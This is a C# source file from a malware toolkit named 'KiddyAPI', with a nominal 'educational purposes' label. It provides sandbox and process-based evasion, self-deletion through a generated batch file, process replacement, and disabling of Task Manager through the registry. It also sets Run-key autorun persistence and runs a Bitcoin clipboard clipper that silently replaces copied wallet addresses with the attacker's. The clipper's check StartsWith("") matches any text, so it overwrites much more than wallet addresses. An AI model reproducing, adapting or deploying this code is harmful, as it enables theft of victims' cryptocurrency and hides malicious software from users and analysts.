/////////////////////////////////////////////////////////
//// Developer : Whiro
//// For for educational purposes
//////////////////////////////////////////////////////////
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace KiddyAPI.Protect
{
    /// <summary>
    ///Access to various methods of hiding / migrating a program
    /// </summary>
    public class HideModule
    {
        private static bool FindProcess(string name)
        {
            try
            
            {
                var process = Process.GetProcesses();
                foreach (var pr in process)
                {
                    if (pr.ProcessName == name)
                        return true;
                    else
                    {
                        continue;
                    }
                }

                return false;
            }
            catch
            {
                return false;
            }
        }
        /// <summary>
        /// Closing a program if a specific process is running
        /// </summary>
        /// <param name="name">Name of process cheking</param>
        public static void CheckProcess(string name)
        {
            try
            {
                if (FindProcess(name))
                {
                    Environment.Exit(0);
                }
            }
            catch { }
        }
        /// <summary>
        /// Check Sandbox dll
        /// </summary>
        public static void CheckSandBox()
        {
            try
            {
                foreach (string sModul in Process.GetCurrentProcess().Modules)
                {
                    if (sModul.Contains("sbiedll.dll")) { Environment.Exit(0); return; }
                }
            }
            catch { }
        }

        /// <summary>
        /// Selfdelete
        /// </summary>
        /// <param name="fileName">Path to own exe</param>
        public static void Suicide(string fileName)
        {
            string _fileName = fileName;
            string _batName = "i";
            string telo = string.Format("@echo off{0}:loop{0}del {1}{0}if exist {1} goto loop{0}del {2}", Environment.NewLine, _fileName, _batName);
            using (StreamWriter strwr = new StreamWriter(_batName, false))
                strwr.Write(telo);
            Process.Start(_batName);
        }

        /// <summary>
        /// Kill the selected process and start ur
        /// </summary>
        /// <param name="name">Process name to kill</param>
        /// <param name="path">Path to ur exe</param>
        public static void Replace(string name, string path)
        {
            var process = Process.GetProcesses();
            foreach (var pr in process)
            {
                if (pr.ProcessName == name)
                {
                    pr.Kill();
                    Process.Start(path);
                }
            }
        }
        /// <summary>
        /// Replace BTC wallet adress
        /// </summary>
        /// <param name="address">Ur address</param>
        public static void Clip(string address)
        {
            while (true)
            {
                Thread.Sleep(15); // Задержка, что бы не перегружать систему
                if (Clipboard.GetText() != address)
                    if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
                        if (Clipboard.GetText().StartsWith("") ||
                            Clipboard.GetText().StartsWith("3") || // Кошельки могут начинаться с 1, 3(мультикошельки)
                            Clipboard.GetText().StartsWith("bc1"))
                        {
                            Clipboard.SetText(address);
                        }
            }
        }

        /// <summary>
        /// On/Off Task Manager
        /// </summary>
        /// <param name="enable">true - on, false - off</param>
        public static void EnableTaskManager(bool enable)
        {
            Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.CurrentUser;
            Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", enable ? 0 : 1,
                Microsoft.Win32.RegistryValueKind.DWord);
        }
        /// <summary>
        /// Autorun
        /// </summary>
        /// <param name="name">Programm name displayed in regedit</param>
        /// <param name="path">Path to exe</param>
        public static void SetAutorun(string name, string path)
        {
            using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            using (var key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key?.SetValue(name, path);
            }
        }
    }
}
